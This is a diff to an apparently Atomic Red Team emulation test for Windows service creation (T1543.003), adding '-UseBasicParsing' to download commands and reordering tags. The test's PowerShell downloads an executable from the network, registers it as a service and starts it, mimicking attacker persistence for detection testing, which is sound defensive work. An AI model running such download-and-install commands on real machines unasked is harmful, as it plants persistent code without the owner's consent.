@@ -16,8 +16,8 @@
           {exit 0} else {exit 1}; then : ; else New-Item -Type Directory (split-path
           "PathToAtomicsFolder\T1543.003\bin\AtomicService.exe") -ErrorAction ignore
           | Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe"
-          -OutFile "PathToAtomicsFolder\T1543.003\bin\AtomicService.exe"; fi; New-Service
-          -Name "AtomicTestService_PowerShell" -BinaryPathName "PathToAtomicsFolder\T1543.003\bin\AtomicService.exe";
+          -OutFile "PathToAtomicsFolder\T1543.003\bin\AtomicService.exe" -UseBasicParsing;
+          fi; New-Service -Name "AtomicTestService_PowerShell" -BinaryPathName "PathToAtomicsFolder\T1543.003\bin\AtomicService.exe";
           Start-Service -Name "AtomicTestService_PowerShell"'
         cleanup: Stop-Service -Name "#{service_name}" 2>&1 | Out-Null; try {(Get-WmiObject
           Win32_Service -filter "name='#{service_name}'").Delete()}; catch {}
@@ -28,9 +28,9 @@
   delete_payload: false
   privilege: ''
   buckets:
+  - privilege-escalation
   - t1543.003
   - atomic-red-team
-  - privilege-escalation
   author: Atomic Red Team
   additional_info:
     input_arguments:
@@ -53,9 +53,9 @@
         -ErrorAction ignore | Out-Null
 
         Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe"
-        -OutFile "#{binary_path}"
+        -OutFile "#{binary_path}" -UseBasicParsing
 
         '
     technique_created: '2020-01-17T19:13:50.402Z'
     atomic_guid: 491a4af6-a521-4b74-b23b-f7b3f1ee9e77
-    import_timestamp: '2026-10-20T07:08:27.176820Z'
+    import_timestamp: '2026-10-21T07:01:49.866622Z'
